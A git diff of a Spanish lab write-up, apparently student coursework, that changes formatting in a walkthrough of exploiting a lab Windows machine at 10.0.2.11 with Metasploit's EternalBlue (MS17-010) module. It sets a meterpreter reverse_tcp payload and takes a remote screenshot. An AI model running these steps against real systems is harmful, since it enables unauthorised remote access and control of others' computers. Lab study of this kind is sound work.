@@ -52,14 +52,14 @@ Con esta herramienta descubriremos puertos y servicios abiertos en la máquina o
 
 En la primera fase ejecutaremos este framework para buscar exploits usar, descargar payloads y ejecutarlos.
 
-*msfconsole*
+**msfconsole**
  	
   ![msfconsole](https://github.com/fernandopaezmartin/SAD_2021--Vulnerabilidades---Metasploit/blob/main/imagenes/5.png)
 
 
 Usaremos su buscador para encontrar el exploit:
 
-*search eternalblue*
+**search eternalblue**
 
   ![search msf](https://github.com/fernandopaezmartin/SAD_2021--Vulnerabilidades---Metasploit/blob/main/imagenes/6.png)
 
@@ -68,22 +68,22 @@ De los resultados elegiremos la primera opción:
 
 ***0  exploit/windows/smb/ms17_010_eternalblue  MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption***
 
-*use 0*
+**use 0**
 
   ![search msf](https://github.com/fernandopaezmartin/SAD_2021--Vulnerabilidades---Metasploit/blob/main/imagenes/8.png)
 
 Nos devuelve:
 
-*No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp*
+**No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp**
 
 
 Vemos que parámetros son requeridos con el comando:
-*options*
+**options**
 
 ![options](https://github.com/fernandopaezmartin/SAD_2021--Vulnerabilidades---Metasploit/blob/main/imagenes/9.png)
 
 
-nos pide datos del equipo remoto o *RHOST*. Le indicamos la ip del equipo remoto 10.0.2.11
+nos pide datos del equipo remoto o **RHOST**. Le indicamos la ip del equipo remoto 10.0.2.11
 
 ![set rhost](https://github.com/fernandopaezmartin/SAD_2021--Vulnerabilidades---Metasploit/blob/main/imagenes/10.png)
 
@@ -93,22 +93,22 @@ Podemos ver una serie de payloads a ejecutar:
 ![varios payloads](https://github.com/fernandopaezmartin/SAD_2021--Vulnerabilidades---Metasploit/blob/main/imagenes/11.png)
 
 
-Vamos a realizar la prueba con el siguiente *windows/x64/meterpreter/reverse_tcp*:
+Vamos a realizar la prueba con el siguiente **windows/x64/meterpreter/reverse_tcp**:
 
 ![reverse_tcp](https://github.com/fernandopaezmartin/SAD_2021--Vulnerabilidades---Metasploit/blob/main/imagenes/12.png)
 
 
-Le indicamos que se ejecute con *run*
+Le indicamos que se ejecute con **run**
 
 ![run](https://github.com/fernandopaezmartin/SAD_2021--Vulnerabilidades---Metasploit/blob/main/imagenes/13.png)
 
 
-Podemos ver las distintas opciones que nos ofrece este exploit con *options*
+Podemos ver las distintas opciones que nos ofrece este exploit con **options**
 
 ![options](https://github.com/fernandopaezmartin/SAD_2021--Vulnerabilidades---Metasploit/blob/main/imagenes/14.png)
 
 
-Como ejemplo ejecutaremos el comando *screenshot* y nos hará una captura de pantalla de la máquina remota.
+Como ejemplo ejecutaremos el comando **screenshot** y nos hará una captura de pantalla de la máquina remota.
 
 
 ![screenshot](https://github.com/fernandopaezmartin/SAD_2021--Vulnerabilidades---Metasploit/blob/main/imagenes/15.png)
